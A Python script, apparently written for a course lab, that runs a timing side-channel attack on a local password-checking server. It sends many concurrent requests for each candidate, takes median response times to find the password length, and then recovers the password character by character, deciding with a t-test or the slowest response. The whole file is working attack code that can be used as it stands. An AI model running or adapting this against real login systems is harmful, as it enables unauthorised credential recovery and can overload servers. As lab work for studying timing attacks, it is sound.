import time
import requests
from statistics import median
from scipy.stats import ttest_ind
from concurrent.futures import ThreadPoolExecutor
from dotenv import load_dotenv
import os

load_dotenv()

ID = os.getenv("ID")

# Configuration
SERVER_URL = "http://127.0.0.1"
USER_ID = ID  # Replace with your ID/username
DIFFICULTY = 4         # Adjust difficulty
CHARACTERS = "abcdefghijklmnopqrstuvwxyz"
RETRIES = 150         # Number of measurements per character (we take the median to mitigate outliers)
WORKERS = 25           # Number of concurrent threads (if this number is too high the code goes crazy, i believe its too many request for the server at the same time)
# keep workers low , WORKERS < (1/2 * RETRIES - 5) or so to keep the server from crashing


def measure_single_request(url):
    """
    Sends a single request to the server and measures its response time.
    """
    try:
        start = time.time()
        requests.get(url)
        end = time.time()
        return end - start
    except requests.exceptions.RequestException:
        return float("inf")  # Handle connection errors gracefully


def measure_time_for_character(i_user, i_difficulty, candidate, retries, workers):
    """
    Measures the median response time for a single candidate password using multiple threads.
    """
    url = f"{SERVER_URL}/?user={i_user}&password={candidate}&difficulty={i_difficulty}"

    # Use ThreadPoolExecutor to perform concurrent requests
    timings = []
    with ThreadPoolExecutor(max_workers=workers) as executor:
        futures = [executor.submit(measure_single_request, url) for _ in range(retries)]
        for future in futures:
            result = future.result()
            if result != float("inf"):  # Ignore failed requests
                timings.append(result)

    # Compute the median time
    return median(timings) if timings else float("inf")


def find_password_length(user, difficulty):
    """
    Determines the password length based on response times.
    """
    print("Determining password length...")
    base_password = "a"

    prev_time = 0
    for length in range(1, 33):  # Test lengths up to 32
        test_password = base_password * length
        med_time = measure_time_for_character(user, difficulty, test_password, RETRIES, WORKERS)
        print(f"Length {length}, median time: {med_time:.5f}s")

        if med_time > prev_time + 0.02:  # Adjust the threshold for difficulty
            print(f"Estimated length: {length}")
            return length
        prev_time = med_time

    print("No length found.")
    return None


def find_password(user, difficulty, length):
    """
    Finds the password by exploiting response times.
    """
    print(f"Searching for password of length {length}...")
    password = ""
    

    for position in range(length):
        #intilize variables for the character that took the longest on average
        max_time = 0
        best_char = ""
        ttest_flag = False
        
        #intilize two groups for ttest
        groupNotLikely = []
        groupLikely = []

        for char in CHARACTERS:
            #create candidate password
            candidate = password + char + "a" * (length - len(password) - 1)
            print(f"Testing '{candidate}' at position {position}...")

            # Measure the response time for the candidate password
            med_time = measure_time_for_character(user, difficulty, candidate, RETRIES, WORKERS)
            print(f"Character '{char}' median time: {med_time:.5f}s")

            #mark it if its the one that took the longest on average so far
            if med_time > max_time:
                max_time = med_time
                best_char = char
            
            # TTest check for significant difference of the character we're on compared to previous ones
            if char <= 'e': # if the character is in the first e characters of the alphabet skip over ttest not enough data
                groupNotLikely.append(med_time)
            else:
                groupLikely.append(med_time)
                t_stat, p_value = ttest_ind(groupNotLikely, groupLikely)
                print(f"p_value: {p_value:.5f}")
                if p_value < 0.005:
                    print(f"Found character by P_Value (ttest) {position}: '{char}' with median time {max_time:.5f}s")
                    password += char
                    print(f"Partial password: {password}")
                    ttest_flag = True
                    break
                else:
                    groupLikely.pop()
                    groupNotLikely.append(med_time)

        #skip to the next position if we found the character by ttest              
        if ttest_flag:
            continue

        #take the character that took the longest on average if no ttest significance was found
        password += best_char
        print(f"Best character at position {position}: '{best_char}' with median time {max_time:.5f}s")
        print(f"Partial password: {password}")

    return password


if __name__ == "__main__":
    # Step 1: Find the password length
    estimated_length = find_password_length(USER_ID, DIFFICULTY)

    # Step 2: Find the password with the estimated length
    if estimated_length:
        final_password = find_password(USER_ID, DIFFICULTY, estimated_length)
        print(f"Final password: {final_password}")
